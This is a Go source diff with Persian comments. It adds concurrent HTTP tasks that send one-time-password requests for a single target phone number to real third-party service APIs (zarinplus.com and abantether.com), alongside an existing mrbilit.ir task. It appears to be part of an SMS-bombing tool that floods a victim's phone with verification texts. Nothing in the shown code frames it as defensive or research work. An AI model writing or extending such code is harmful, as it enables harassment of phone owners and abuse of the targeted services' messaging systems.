@@ -348,8 +348,25 @@ cookieJar, _ := cookiejar.New(nil)
 
 
 
-
-
+		// 1. سرویس zarinplus.com (JSON)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				sendJSONRequest(c, ctx, "https://api.zarinplus.com/user/otp/", map[string]interface{}{
+					"phone_number": getPhoneNumber98NoZero(phone), // نیاز به کد 98 دارد
+					"source": "zarinplus",
+				}, &wg, ch)
+			}
+		}(client)
+		// 3. سرویس api.abantether.com (JSON)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				sendJSONRequest(c, ctx, "https://api.abantether.com/api/v2/auths/register/phone/send", map[string]interface{}{
+					"phone_number": formatPhoneWithSpaces(phone), // از تابع فرمت با فاصله استفاده کنید یا تابع مناسب دیگر
+				}, &wg, ch)
+			}
+		}(client)
 		// mrbilit.ir (OTP - GET)
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { // capture client
